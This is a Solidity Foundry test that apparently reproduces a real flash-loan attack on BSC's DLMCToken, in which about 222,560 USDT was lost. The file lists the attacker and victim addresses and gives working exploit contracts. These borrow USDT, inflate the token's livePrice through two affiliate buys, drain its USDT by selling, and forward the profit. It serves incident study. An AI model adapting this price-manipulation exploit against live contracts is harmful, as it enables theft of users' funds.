// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 222,560.22 USDT
// Attacker : 0x701bb7b460ae231dbbcfa3d87f0ab5b458429699
// Attack Contract : 0xe81bf6e392eca9ad594b5452ea53cf7071760a04
// Attack Deployer : 0x74c4a756933d0f713facb1dea325ef511646c3b1
// Vulnerable Contract : 0xf2ca2a3572b26ae7c479dc7ae36d922113b1bdf2
// Victim : 0xf2ca2a3572b26ae7c479dc7ae36d922113b1bdf2
// Attack Tx : https://bscscan.com/tx/0x151025d3f0a782340a74d30ef33a5fad044b838e74437a803f0652e70c231306

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xf2ca2a3572b26ae7c479dc7ae36d922113b1bdf2#code

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2069957542109958498
//
// The attacker used a Pancake USDT/WBNB flash swap to buy DLMC through two registered contracts. The second buy
// inflated DLMCToken's reserve-derived livePrice, then the first contract sold the maximum DLMC amount backed by
// DLMCToken's USDT balance, draining nearly all protocol USDT before repaying the Pancake pair.

address constant ATTACKER = 0x701Bb7B460ae231DBBcFA3d87f0aB5B458429699;
address constant ATTACK_DEPLOYER = 0x74c4A756933D0F713FAcB1DeA325eF511646c3B1;
address constant DLMC_TOKEN = 0xF2ca2A3572B26Ae7c479dC7ae36D922113B1bdF2;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant PANCAKE_USDT_WBNB_PAIR = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
address constant REGISTERED_REFERRER = 0x62cefE76EEcc737D7ee384eFDbAd8D2C53c1d792;

interface IDLMCToken is IERC20 {
    function registerAffiliate(
        address referrer
    ) external;
    function buy(
        uint256 amountQuote
    ) external;
    function sell(
        uint256 amountTokens
    ) external;
    function livePrice() external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 106_091_606;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker profit receiver");
        vm.label(ATTACK_DEPLOYER, "Attack deployer");
        vm.label(DLMC_TOKEN, "DLMCToken");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(PANCAKE_USDT_WBNB_PAIR, "Pancake USDT/WBNB pair");
        vm.label(REGISTERED_REFERRER, "Registered DLMC referrer");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);

        vm.startPrank(ATTACK_DEPLOYER, ATTACK_DEPLOYER);
        DLMCExploit exploit = new DLMCExploit(ATTACKER);
        exploit.execute();
        vm.stopPrank();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 222_000 ether, "USDT profit after Pancake repayment");
        assertLe(IERC20(USDT_TOKEN).balanceOf(DLMC_TOKEN), 10, "DLMCToken USDT drained");
    }
}

contract DLMCExploit {
    IDLMCToken private constant dlmc = IDLMCToken(DLMC_TOKEN);
    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IPancakePair private constant pair = IPancakePair(PANCAKE_USDT_WBNB_PAIR);

    uint256 private constant FLASH_USDT = 1_420_000 ether;

    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function execute() external {
        require(IPancakePair(PANCAKE_USDT_WBNB_PAIR).token0() == USDT_TOKEN, "unexpected token0");
        require(IPancakePair(PANCAKE_USDT_WBNB_PAIR).token1() == WBNB_TOKEN, "unexpected token1");

        // step 1: borrow USDT from the Pancake USDT/WBNB pair.
        pair.swap(FLASH_USDT, 0, address(this), abi.encode(uint256(1)));
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata
    ) external {
        require(msg.sender == PANCAKE_USDT_WBNB_PAIR, "not Pancake pair");
        require(sender == address(this), "unexpected sender");
        require(amount0 == FLASH_USDT && amount1 == 0, "unexpected flash amount");

        // step 2: register the coordinator under the same already-registered referrer used in the trace.
        dlmc.registerAffiliate(REGISTERED_REFERRER);

        // step 3: first buy from the coordinator; this gives the coordinator investment capacity for sell().
        usdt.approve(DLMC_TOKEN, type(uint256).max);
        uint256 firstBuyUsdt = 420_000 ether;
        dlmc.buy(firstBuyUsdt);

        // step 4: second buy from a child helper registered under the coordinator.
        DLMCBuyHelper helper = new DLMCBuyHelper();
        uint256 helperBuyUsdt = 1_000_000 ether;
        usdt.transfer(address(helper), helperBuyUsdt);
        helper.buy(DLMC_TOKEN, USDT_TOKEN, address(this), helperBuyUsdt);

        // step 5: derive the trace sell amount from current DLMC liquidity and livePrice.
        uint256 tokenBalance = dlmc.balanceOf(address(this));
        uint256 liquidityBackedSellAmount = (usdt.balanceOf(DLMC_TOKEN) * 1e18) / dlmc.livePrice();
        uint256 sellAmount = tokenBalance < liquidityBackedSellAmount ? tokenBalance : liquidityBackedSellAmount;
        dlmc.sell(sellAmount);

        // step 6: repay the Pancake V2 flash swap with the pair's 0.25% fee.
        uint256 repayAmount = _pancakeRepay(FLASH_USDT);
        usdt.transfer(PANCAKE_USDT_WBNB_PAIR, repayAmount);

        // step 7: forward the remaining USDT to the trace profit receiver.
        usdt.transfer(profitReceiver, usdt.balanceOf(address(this)));
    }

    function _pancakeRepay(
        uint256 amount
    ) private pure returns (uint256) {
        return (amount * 10_000) / 9975 + 1;
    }
}

contract DLMCBuyHelper {
    function buy(
        address dlmcToken,
        address quoteToken,
        address referrer,
        uint256 amount
    ) external {
        IDLMCToken dlmc_ = IDLMCToken(dlmcToken);
        IERC20 usdt_ = IERC20(quoteToken);

        // step 4a: the trace helper registers under the main coordinator before buying.
        dlmc_.registerAffiliate(referrer);
        usdt_.approve(dlmcToken, type(uint256).max);
        dlmc_.buy(amount);
    }
}
